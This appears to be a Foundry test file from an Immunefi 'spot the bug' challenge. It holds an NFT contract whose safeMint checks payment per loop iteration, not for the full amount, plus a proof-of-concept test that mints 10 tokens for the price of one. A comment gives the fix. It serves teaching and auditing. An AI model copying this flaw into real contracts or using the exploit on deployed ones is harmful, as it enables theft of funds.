// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Counters.sol";

// Immunefi #spotthebugchallenge!
// https://twitter.com/immunefi/status/1557301712549023745

contract ContractTest is Test {
    HerToken HerTokenContract;

    function testSafeMint() public {
        HerTokenContract = new HerToken();
        HerTokenContract.safeMint{value: 1 ether}(address(this), 10);
        console.log("total minted", HerTokenContract.balanceOf(address(this)));
        console.log("we got 10 nfts for the price of 1 nft");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        //   HerTokenContract.safeMint{value: 1 ether}(address(this),30);
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract HerToken is ERC721, Ownable, Test {
    uint128 constant MINT_PRICE = 1 ether;
    uint128 constant MAX_SUPPLY = 10000;
    uint mintIndex;
    using Counters for Counters.Counter;
    Counters.Counter private _tokenIdCounter;

    constructor() payable ERC721("HarToken", "HRT") {}

    function safeMint(address to, uint256 amount) public payable {
        require(
            _tokenIdCounter.current() + amount < MAX_SUPPLY,
            "Cannot mint given amount."
        );
        require(amount > 0, "Must give a mint amount.");
        //fix require(msg.value >= MINT_PRICE * amount, "Insufficient Ether.");
        // before the loop
        for (uint256 i = 0; i < amount; i++) {
            require(msg.value >= MINT_PRICE, "Insufficient Ether.");

            mintIndex = _tokenIdCounter.current();
            console.log("mintIndex", mintIndex);
            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.
            _tokenIdCounter.increment();
        }
    }
}
